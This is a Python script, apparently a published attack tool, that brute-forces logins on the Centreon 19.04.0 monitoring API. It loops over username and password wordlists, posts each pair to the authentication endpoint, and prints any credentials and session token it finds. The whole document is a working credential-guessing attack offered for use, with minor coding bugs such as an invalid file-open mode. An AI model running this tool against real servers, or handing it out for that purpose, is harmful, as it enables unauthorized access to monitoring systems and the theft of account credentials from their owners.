#!/usr/bin/env python
# centreon API 19.04.0 - password bruteforcer
# Written on 6 Nov 2019
# Referencing API Authentication of the centreon API document
# rewritten in python code by rat3l
# centbruteon.py

import time, struct, sys
import requests
import argparse
from termcolor import colored

parser = argparse.ArgumentParser()
parser.add_argument('-u',dest='host', help='Define your target url')
parser.add_argument('-l',dest='username', help='Specific username')
parser.add_argument('-L',dest='userfile',  help='username wordlist')
parser.add_argument('-w',dest='passwfile', type=str, help='Specify Password wordlist')
if len(sys.argv)==1:
    parser.print_help(sys.stderr)
    sys.exit(1)
args = parser.parse_args()

server = args.host
user = args.username
passfile = open(args.passwfile, "read")
passfile = passfile.read().splitlines()
usrwl = args.userfile
dirlo = '/centreon/api/index.php?action=authenticate'

if user and passfile:

    for password in passfile:
        data = {'username':user, 'password':password}
        r = requests.post('http://'+ server + dirlo , data)

        try:

            print ('Processing...')
            print colored('Brute forcing on Server : '), colored(server, 'yellow'), colored(' Username: '), colored(user, 'yellow'), colored(' Password: '), colored(password, 'yellow')

            r
            if r:
                print colored('Credentials found: username: ') ,colored(user,'green') ,colored(' password: '), colored(password,'green'), colored(' server: '+server)
                print colored('Token: '), colored(r.content, 'cyan')
                print ('\n')
                break;
            else:
                print colored('403 - Unauthenticated!', 'red')
        except IndexError:
            print colored('Something went wrong', 'red')

            r.close()

elif usrwl and passfile:
    usrwl = open(args.userfile, "r")
    usrwl = usrwl.read().splitlines()
    for usr in usrwl:
        for password in passfile:
            data = {'username':usr, 'password':password}
            r = requests.post('http://'+ server + dirlo , data)

            try:

                print ('Processing...')
                print colored('Brute forcing on Server : '), colored(server, 'yellow'), colored(' Username: '), colored(usr, 'yellow'), colored(' Password: '), colored(password, 'yellow')

                r
                if r:
                    print colored('Credentials found: username: ') ,colored(usr,'green') ,colored(' password: '), colored(password,'green'), colored(' server: '+server)
                    print colored('Token: '), colored(r.content, 'cyan')
                    print ('\n')
                else:
                    print colored('403 - Unauthenticated!', 'red')
            except IndexError:
                print colored('Something went wrong', 'red')

                r.close()

else:
    print colored ('Something went Wrong!', 'red')
sys.exit()

